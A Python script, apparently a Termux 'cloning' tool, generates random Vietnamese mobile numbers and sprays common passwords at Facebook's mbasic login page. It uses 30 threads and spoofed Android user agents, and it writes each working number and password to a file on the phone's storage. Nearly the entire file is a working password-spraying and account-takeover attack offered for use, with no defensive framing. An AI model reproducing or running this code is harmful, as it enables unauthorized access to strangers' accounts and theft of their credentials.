# VIETNAM SPECIAL CLONING SYSTEM
# AUTHOR : CHARSI BRAND
# REGION : VIETNAM (VN)
# SPEED  : ULTRA MAX (30 THREADS)

import os, sys, re, time, random, json, subprocess
from concurrent.futures import ThreadPoolExecutor as tred

#▬▭▬▭▬▭▬▭[ AUTO INSTALLER ]▬▭▬▭▬▭▬▭#
try:
    import requests
    from bs4 import BeautifulSoup as sop
except ImportError:
    os.system('pip install requests bs4')

#▬▭▬▭▬▭▬▭[ NEW COLOR THEME ]▬▭▬▭▬▭▬▭#
P = "\033[1;35m" # Purple
C = "\033[1;36m" # Cyan
W = "\033[1;37m" # White
R = "\033[1;31m" # Red
G = "\033[1;32m" # Green
Y = "\033[1;33m" # Yellow
S = f"{W}[{P}●{W}]"

#▬▭▬▭▬▭▬▭[ VIETNAM SPECIAL UA ]▬▭▬▭▬▭▬▭#
def get_vn_ua():
    # Focused on Oppo/Vivo/Xiaomi models popular in Vietnam
    model = random.choice(['CPH2307', 'V2204', 'M2101K6G', 'SM-A736B', 'RMX3370'])
    version = random.randint(11, 14)
    chrome = f"{random.randint(110, 126)}.0.{random.randint(4000, 6000)}.{random.randint(10, 150)}"
    return f"Mozilla/5.0 (Linux; Android {version}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{random.randint(400, 500)}.0.0.0;]"

#▬▭▬▭▬▭▬▭[ BOLD LOGO ]▬▭▬▭▬▭▬▭#
logo = f"""{P}
  █   █ ███ ███ ███ █   █  ███ █   █
  █   █  █  █    █  ██ ██  █   ██  █
  █ █ █  █  ███  █  █ █ █  ███ █ █ █
  █▄█▄█  █  █    █  █   █  █   █  ██
   █ █  ███ ███  █  █   █  ███ █   █ {C}VN-SPEED
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{S} {C}AUTHOR   {W}: {P}CHARSI BRAND
{S} {C}REGION   {W}: {P}VIETNAM (VN)
{S} {C}NETWORKS {W}: {P}VIETTEL, VINAPHONE, MOBIFONE
{S} {C}VERSION  {W}: {G}3.0 (ULTRA SPEED)
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

class VietnamCloner:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []

    def menu(self):
        os.system('clear'); print(logo)
        print(f"{W}[{P}1{W}] {C}START VIETNAM NUMBER CLONING")
        print(f"{W}[{P}2{W}] {C}JOIN TELEGRAM CHANNEL")
        print(f"{W}[{P}0{W}] {C}EXIT")
        opt = input(f"\n{P}SELECT {W}: {RESET if 'RESET' in globals() else ''}")
        if opt == '1': self.vn_start()
        else: exit()

    def vn_start(self):
        os.system('clear'); print(logo)
        print(f"{S} {C}VN CODES: 032, 033, 034, 035, 036, 037, 038, 039")
        print(f"{S} {C}VN CODES: 081, 082, 083, 084, 085, 070, 079")
        code = input(f"{S} {C}ENTER NETWORK CODE {W}: ")
        try:
            limit = int(input(f"{S} {C}ENTER LIMIT (e.g 10000) {W}: "))
        except: limit = 5000
        
        print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{S} {C}CLONING STARTED... USE AIRPLANE MODE FOR SPEED")
        print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        with tred(max_workers=30) as pool:
            for _ in range(limit):
                # VN Numbers: Code + 7 random digits
                num = code + "".join(random.choices("0123456789", k=7))
                # VN Common Password Patterns
                pws = [num, num[3:], '123456', '12345678', '654321', 'anhyeuem', 'congchua']
                pool.submit(self.crack, num, pws)
        
        print(f"\n{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{S} {G}OK: {len(self.oks)} {W}| {S} {R}CP: {len(self.cps)}")

    def crack(self, user, pws):
        sys.stdout.write(f"\r{W}[CHARSI-VN] {self.loop} | {G}OK:{len(self.oks)} {R}CP:{len(self.cps)} "); sys.stdout.flush()
        try:
            for pw in pws:
                ua = get_vn_ua()
                ses = requests.Session()
                url = "https://mbasic.facebook.com/login.php"
                res = ses.get(url).text
                data = {
                    "lsd": re.search('name="lsd" value="(.*?)"', res).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', res).group(1),
                    "email": user,
                    "pass": pw,
                    "login": "Log In"
                }
                head = {
                    'Host': 'mbasic.facebook.com',
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                    'referer': 'https://mbasic.facebook.com/',
                    'origin': 'https://mbasic.facebook.com'
                }
                post = ses.post(url, data=data, headers=head, allow_redirects=False)
                
                if "c_user" in ses.cookies.get_dict():
                    print(f"\n{G}[CHARSI-OK] {user} | {pw}")
                    self.oks.append(user)
                    open('/sdcard/VN-OK.txt', 'a').write(f"{user}|{pw}\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    self.cps.append(user)
                    break
            self.loop += 1
        except: pass

if __name__ == "__main__":
    if not os.path.exists('/sdcard'): os.system('termux-setup-storage')
    VietnamCloner().menu()
